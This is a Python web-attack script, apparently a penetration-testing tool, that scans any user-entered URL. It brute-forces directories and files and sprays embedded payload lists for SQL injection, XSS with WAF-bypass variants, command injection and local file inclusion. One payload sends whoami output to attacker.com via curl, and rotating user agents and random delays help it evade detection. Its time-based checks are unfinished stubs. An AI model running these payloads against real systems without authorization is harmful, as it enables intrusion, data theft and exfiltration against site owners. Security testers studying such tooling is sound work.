#!/usr/bin/env python3
"""
🔥 ENHANCED PENETRATION SUITE WITH OPEN-SOURCE INTEGRATION
========================================================

This script integrates techniques from:
- SecLists (wordlists and fuzzing)
- PayloadsAllTheThings (exploit payloads)
- Your existing penetration testing framework

Features:
✅ Professional wordlist integration
✅ Advanced payload collections
✅ Async processing for performance
✅ Comprehensive logging
✅ Memory-efficient batch processing
"""

import asyncio
import aiohttp
import json
import sqlite3
import logging
import time
import random
from pathlib import Path
from urllib.parse import urljoin, quote
from typing import List, Dict, Any, Optional
import hashlib
import base64

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('enhanced_penetration.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class EnhancedPenetrationSuite:
    """Enhanced penetration testing suite with open-source integration"""
    
    def __init__(self):
        self.session = None
        self.results = []
        self.vulnerabilities = []
        
        # SecLists-inspired wordlists (embedded for portability)
        self.common_files = [
            'admin', 'administrator', 'backup', 'config', 'database', 'db',
            'test', 'staging', 'dev', 'development', 'temp', 'tmp',
            'wp-admin', 'wp-config.php', 'phpinfo.php', '.env',
            'robots.txt', 'sitemap.xml', '.htaccess', 'web.config'
        ]
        
        self.common_dirs = [
            'admin', 'administrator', 'backup', 'config', 'database',
            'uploads', 'files', 'images', 'css', 'js', 'api',
            'v1', 'v2', 'test', 'staging', 'dev', 'wp-admin',
            'wp-content', 'wp-includes', 'phpmyadmin'
        ]
        
        # PayloadsAllTheThings-inspired payloads
        self.sql_payloads = [
            # Union-based SQL injection
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            
            # Boolean-based blind SQL injection
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # NoSQL injection
            "' || '1'=='1",
            "' && '1'=='1",
            "{\"$ne\": null}",
            "{\"$regex\": \".*\"}"
        ]
        
        self.xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # Event handler XSS
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            
            # Filter bypass XSS
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src=\"javascript:alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            
            # Polyglot XSS
            "'\";alert('XSS');//",
            "';alert('XSS');//",
            "\");alert('XSS');//",
            
            # WAF bypass XSS
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",  # base64 encoded
            "<<SCRIPT>alert('XSS')<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        self.command_injection_payloads = [
            # Unix command injection
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; uname -a",
            "| ps aux",
            
            # Windows command injection
            "& dir",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "&& whoami",
            "| systeminfo",
            
            # Blind command injection
            "; sleep 5",
            "| ping -c 5 127.0.0.1",
            "&& timeout 5",
            "; curl http://attacker.com/$(whoami)"
        ]
        
        self.lfi_payloads = [
            # Basic LFI
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            
            # Null byte LFI (for older systems)
            "../../../etc/passwd%00",
            "..\\..\\..\\boot.ini%00",
            
            # Filter bypass LFI
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            # PHP wrapper LFI
            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "php://filter/read=string.rot13/resource=../../../etc/passwd",
            "file:///etc/passwd",
            
            # Log poisoning LFI
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "C:\\xampp\\apache\\logs\\access.log"
        ]

    async def setup_session(self):
        """Setup async HTTP session with realistic headers"""
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
        timeout = aiohttp.ClientTimeout(total=30)
        
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        )

    async def directory_bruteforce(self, base_url: str, wordlist: List[str] = None) -> List[Dict]:
        """Enhanced directory brute force using SecLists-inspired wordlists"""
        if wordlist is None:
            wordlist = self.common_dirs
            
        logger.info(f"🔍 Starting directory brute force on {base_url}")
        found_directories = []
        
        semaphore = asyncio.Semaphore(20)  # Limit concurrent requests
        
        async def check_directory(directory):
            async with semaphore:
                try:
                    url = urljoin(base_url.rstrip('/') + '/', directory + '/')
                    async with self.session.get(url) as response:
                        if response.status in [200, 301, 302, 403]:
                            result = {
                                'url': url,
                                'status': response.status,
                                'directory': directory,
                                'size': len(await response.text()) if response.status == 200 else 0
                            }
                            found_directories.append(result)
                            logger.info(f"✅ Found directory: {url} [{response.status}]")
                            
                    # Add random delay to avoid rate limiting
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                    
                except Exception as e:
                    logger.debug(f"❌ Error checking {directory}: {e}")
        
        # Execute directory checks concurrently
        tasks = [check_directory(directory) for directory in wordlist]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"🎯 Directory brute force complete. Found {len(found_directories)} directories")
        return found_directories

    async def file_discovery(self, base_url: str, wordlist: List[str] = None) -> List[Dict]:
        """Enhanced file discovery using SecLists-inspired wordlists"""
        if wordlist is None:
            wordlist = self.common_files
            
        logger.info(f"🔍 Starting file discovery on {base_url}")
        found_files = []
        
        semaphore = asyncio.Semaphore(20)
        extensions = ['', '.php', '.asp', '.aspx', '.jsp', '.txt', '.bak', '.old', '.backup']
        
        async def check_file(filename):
            async with semaphore:
                for ext in extensions:
                    try:
                        test_file = filename + ext
                        url = urljoin(base_url.rstrip('/') + '/', test_file)
                        
                        async with self.session.get(url) as response:
                            if response.status == 200:
                                content = await response.text()
                                result = {
                                    'url': url,
                                    'status': response.status,
                                    'filename': test_file,
                                    'size': len(content),
                                    'content_preview': content[:200] if content else ''
                                }
                                found_files.append(result)
                                logger.info(f"✅ Found file: {url} [{len(content)} bytes]")
                                break  # Found file, no need to check other extensions
                                
                        await asyncio.sleep(random.uniform(0.1, 0.3))
                        
                    except Exception as e:
                        logger.debug(f"❌ Error checking {test_file}: {e}")
        
        tasks = [check_file(filename) for filename in wordlist]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"🎯 File discovery complete. Found {len(found_files)} files")
        return found_files

    async def sql_injection_test(self, base_url: str, parameters: List[str] = None) -> List[Dict]:
        """Enhanced SQL injection testing with PayloadsAllTheThings payloads"""
        if parameters is None:
            parameters = ['id', 'user', 'search', 'q', 'name', 'page', 'category']
            
        logger.info(f"💉 Starting SQL injection testing on {base_url}")
        vulnerabilities = []
        
        sql_error_patterns = [
            'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
            'ORA-01756', 'ORA-00921', 'ORA-00936',
            'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
            'PostgreSQL query failed', 'pg_query()', 'pg_exec()',
            'SQLite error', 'sqlite3.OperationalError', 'sqlite_query',
            'Warning: mysql_', 'Warning: pg_', 'Warning: sqlite_',
            'MySQLSyntaxErrorException', 'com.mysql.jdbc.exceptions',
            'SQL syntax.*MySQL', 'Warning.*mysql_.*', 'valid MySQL result',
            'PostgreSQL.*ERROR', 'Warning.*PostgreSQL'
        ]
        
        async def test_parameter(param, payload):
            try:
                test_url = f"{base_url}?{param}={quote(payload)}"
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    content_lower = content.lower()
                    
                    # Check for SQL error patterns
                    for pattern in sql_error_patterns:
                        if pattern.lower() in content_lower:
                            vulnerability = {
                                'type': 'SQL Injection',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': pattern,
                                'response_snippet': content[:500]
                            }
                            vulnerabilities.append(vulnerability)
                            logger.warning(f"🚨 SQL Injection found: {param} with payload: {payload}")
                            return vulnerability
                    
                    # Check for time-based injection (if payload includes sleep/delay)
                    if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                        # Time-based detection would require measuring response time
                        pass
                        
                await asyncio.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                logger.debug(f"❌ Error testing {param} with {payload}: {e}")
                
        # Test each parameter with each payload
        tasks = []
        for param in parameters:
            for payload in self.sql_payloads:
                tasks.append(test_parameter(param, payload))
                
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"🎯 SQL injection testing complete. Found {len(vulnerabilities)} potential vulnerabilities")
        return vulnerabilities

    async def xss_testing(self, base_url: str, parameters: List[str] = None) -> List[Dict]:
        """Enhanced XSS testing with PayloadsAllTheThings payloads"""
        if parameters is None:
            parameters = ['q', 'search', 'name', 'comment', 'message', 'input']
            
        logger.info(f"🕷️ Starting XSS testing on {base_url}")
        vulnerabilities = []
        
        async def test_xss(param, payload):
            try:
                test_url = f"{base_url}?{param}={quote(payload)}"
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    # Check if payload is reflected in response
                    if payload in content or payload.replace('"', '&quot;') in content:
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'subtype': 'Reflected XSS',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Payload reflected in response'
                        }
                        vulnerabilities.append(vulnerability)
                        logger.warning(f"🚨 XSS found: {param} with payload: {payload}")
                        
                await asyncio.sleep(random.uniform(0.1, 0.3))
                
            except Exception as e:
                logger.debug(f"❌ Error testing XSS on {param}: {e}")
        
        tasks = []
        for param in parameters:
            for payload in self.xss_payloads[:10]:  # Limit payloads for efficiency
                tasks.append(test_xss(param, payload))
                
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"🎯 XSS testing complete. Found {len(vulnerabilities)} potential vulnerabilities")
        return vulnerabilities

    async def command_injection_test(self, base_url: str, parameters: List[str] = None) -> List[Dict]:
        """Enhanced command injection testing"""
        if parameters is None:
            parameters = ['cmd', 'command', 'exec', 'system', 'ping', 'host']
            
        logger.info(f"⚡ Starting command injection testing on {base_url}")
        vulnerabilities = []
        
        command_output_patterns = [
            r"uid=\d+.*gid=\d+",  # Linux id command
            r"Linux.*\d+\.\d+\.\d+",  # uname output
            r"Volume.*Serial Number",  # Windows dir
            r"total \d+",  # ls -la output
            r"drwx.*root root",  # directory listing
            r"Microsoft Windows.*Version",  # Windows systeminfo
            r"root:.*:/bin/",  # /etc/passwd content
        ]
        
        async def test_command(param, payload):
            try:
                test_url = f"{base_url}?{param}={quote(payload)}"
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    # Check for command execution output patterns
                    for pattern in command_output_patterns:
                        if re.search(pattern, content):
                            vulnerability = {
                                'type': 'Command Injection',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': pattern,
                                'response_snippet': content[:500]
                            }
                            vulnerabilities.append(vulnerability)
                            logger.warning(f"🚨 Command injection found: {param} with payload: {payload}")
                            break
                            
                await asyncio.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                logger.debug(f"❌ Error testing command injection on {param}: {e}")
        
        tasks = []
        for param in parameters:
            for payload in self.command_injection_payloads:
                tasks.append(test_command(param, payload))
                
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"🎯 Command injection testing complete. Found {len(vulnerabilities)} potential vulnerabilities")
        return vulnerabilities

    async def lfi_testing(self, base_url: str, parameters: List[str] = None) -> List[Dict]:
        """Enhanced Local File Inclusion testing"""
        if parameters is None:
            parameters = ['file', 'page', 'include', 'path', 'document', 'template']
            
        logger.info(f"📁 Starting LFI testing on {base_url}")
        vulnerabilities = []
        
        lfi_indicators = [
            'root:.*:/bin/',  # /etc/passwd
            'localhost.*127.0.0.1',  # hosts file
            '\\[boot loader\\]',  # boot.ini
            'CREATE TABLE',  # database files
            '<?php',  # PHP files
        ]
        
        async def test_lfi(param, payload):
            try:
                test_url = f"{base_url}?{param}={quote(payload)}"
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    # Check for LFI indicators
                    for indicator in lfi_indicators:
                        if re.search(indicator, content, re.IGNORECASE):
                            vulnerability = {
                                'type': 'Local File Inclusion (LFI)',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': indicator,
                                'response_snippet': content[:500]
                            }
                            vulnerabilities.append(vulnerability)
                            logger.warning(f"🚨 LFI found: {param} with payload: {payload}")
                            break
                            
                await asyncio.sleep(random.uniform(0.2, 0.5))
                
            except Exception as e:
                logger.debug(f"❌ Error testing LFI on {param}: {e}")
        
        tasks = []
        for param in parameters:
            for payload in self.lfi_payloads:
                tasks.append(test_lfi(param, payload))
                
        await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"🎯 LFI testing complete. Found {len(vulnerabilities)} potential vulnerabilities")
        return vulnerabilities

    async def comprehensive_scan(self, target_url: str) -> Dict[str, Any]:
        """Run comprehensive penetration test"""
        logger.info(f"🚀 Starting comprehensive penetration test on {target_url}")
        start_time = time.time()
        
        await self.setup_session()
        
        try:
            # Run all tests concurrently for maximum efficiency
            results = await asyncio.gather(
                self.directory_bruteforce(target_url),
                self.file_discovery(target_url),
                self.sql_injection_test(target_url),
                self.xss_testing(target_url),
                self.command_injection_test(target_url),
                self.lfi_testing(target_url),
                return_exceptions=True
            )
            
            directories, files, sql_vulns, xss_vulns, cmd_vulns, lfi_vulns = results
            
            # Compile comprehensive report
            scan_report = {
                'target': target_url,
                'scan_start': time.ctime(start_time),
                'scan_duration': time.time() - start_time,
                'findings': {
                    'directories_found': len(directories) if isinstance(directories, list) else 0,
                    'files_found': len(files) if isinstance(files, list) else 0,
                    'sql_injection_vulns': len(sql_vulns) if isinstance(sql_vulns, list) else 0,
                    'xss_vulns': len(xss_vulns) if isinstance(xss_vulns, list) else 0,
                    'command_injection_vulns': len(cmd_vulns) if isinstance(cmd_vulns, list) else 0,
                    'lfi_vulns': len(lfi_vulns) if isinstance(lfi_vulns, list) else 0
                },
                'detailed_results': {
                    'directories': directories if isinstance(directories, list) else [],
                    'files': files if isinstance(files, list) else [],
                    'vulnerabilities': {
                        'sql_injection': sql_vulns if isinstance(sql_vulns, list) else [],
                        'xss': xss_vulns if isinstance(xss_vulns, list) else [],
                        'command_injection': cmd_vulns if isinstance(cmd_vulns, list) else [],
                        'lfi': lfi_vulns if isinstance(lfi_vulns, list) else []
                    }
                }
            }
            
            # Calculate risk score
            total_vulns = (scan_report['findings']['sql_injection_vulns'] +
                          scan_report['findings']['xss_vulns'] +
                          scan_report['findings']['command_injection_vulns'] +
                          scan_report['findings']['lfi_vulns'])
            
            scan_report['risk_score'] = min(100, total_vulns * 15)  # Cap at 100
            scan_report['risk_level'] = (
                'Critical' if scan_report['risk_score'] >= 80 else
                'High' if scan_report['risk_score'] >= 60 else
                'Medium' if scan_report['risk_score'] >= 30 else
                'Low'
            )
            
            logger.info(f"🎯 Comprehensive scan complete. Risk Level: {scan_report['risk_level']} ({scan_report['risk_score']}/100)")
            
            return scan_report
            
        finally:
            await self.session.close()

    def save_results(self, results: Dict[str, Any], filename: str = None):
        """Save scan results to JSON file"""
        if filename is None:
            timestamp = int(time.time())
            filename = f"enhanced_pentest_results_{timestamp}.json"
            
        filepath = Path(filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            
        logger.info(f"💾 Results saved to {filepath}")
        return filepath

async def main():
    """Main execution function"""
    print("🔥 ENHANCED PENETRATION SUITE")
    print("=" * 50)
    print("🎯 Integrating techniques from:")
    print("   • SecLists (wordlists & fuzzing)")
    print("   • PayloadsAllTheThings (exploit payloads)")
    print("   • Your existing framework")
    print("=" * 50)
    
    # Example usage
    target = input("🎯 Enter target URL (e.g., http://example.com): ").strip()
    
    if not target:
        target = "http://httpbin.org"  # Safe testing target
        print(f"Using default target: {target}")
    
    suite = EnhancedPenetrationSuite()
    
    try:
        results = await suite.comprehensive_scan(target)
        
        # Display summary
        print("\n🎯 SCAN SUMMARY")
        print("=" * 30)
        print(f"Target: {results['target']}")
        print(f"Duration: {results['scan_duration']:.2f} seconds")
        print(f"Risk Level: {results['risk_level']} ({results['risk_score']}/100)")
        print("\nFindings:")
        print(f"  📁 Directories: {results['findings']['directories_found']}")
        print(f"  📄 Files: {results['findings']['files_found']}")
        print(f"  💉 SQL Injection: {results['findings']['sql_injection_vulns']}")
        print(f"  🕷️ XSS: {results['findings']['xss_vulns']}")
        print(f"  ⚡ Command Injection: {results['findings']['command_injection_vulns']}")
        print(f"  📁 LFI: {results['findings']['lfi_vulns']}")
        
        # Save results
        output_file = suite.save_results(results)
        print(f"\n💾 Detailed results saved to: {output_file}")
        
    except KeyboardInterrupt:
        print("\n⚠️ Scan interrupted by user")
    except Exception as e:
        logger.error(f"❌ Scan failed: {e}")

if __name__ == "__main__":
    import re
    asyncio.run(main())
